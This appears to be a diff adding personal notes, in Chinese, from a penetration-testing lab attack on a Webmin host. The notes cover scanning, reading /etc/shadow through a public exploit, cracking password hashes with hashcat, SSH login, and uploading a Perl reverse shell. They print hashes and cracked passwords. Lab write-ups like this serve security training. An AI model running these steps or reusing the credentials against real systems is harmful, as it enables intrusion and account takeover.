@@ -1,0 +1,37 @@
+nmap -sC -sV -Pn 10.11.1.141 > nmap.txt
+nmap -p-  10.11.1.141 > nmapall.txt
+gobuster dir  -u http://10.11.1.141:10000/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+
+
+
+
+1.nmap掃描發現有10000端口跑者,webmin服務
+2.搜索漏洞發現有1997.php腳本
+3.更新php版本
+sudo apt-get update
+sudo apt --fix-broken install
+sudo apt-get install php7.4-curl
+4.使用1997.php腳本可以查看到etc/shadow密碼
+5.hashcat破解後取得alice/bob帳密
+hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
+6.ssh使用指定驗證方式可以登入機器
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 alice@10.11.1.141
+7.因為webmin是用perl語言跑得,所以可以上傳perl的reverse.shell檔案
+/usr/share/webshells/perl/perl-reverse-shell.pl
+8.此時還不能執行,必須將腳本改成.cgi後綴以及給予執行權限
+mv perl-reverse-shell.pl perl-reverse-shell.cgi
+chmod +x perl-reverse-shell.cgi
+
+
+ssh  user@legacyhost
+
+bob:  $1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/ :16903:0:99999:7:::
+alice:$1$BfWG661G$ye24xqRQEx.nq.bZTATwf. :16917:0:99999:7:::6c6f6164696e6731
+root: $1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0 :16903:0:99999:7:::
+
+$1$BfWG661G$ye24xqRQEx.nq.bZTATwf.:loading1
+$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:BUGZBUNNY
+
+
+
+
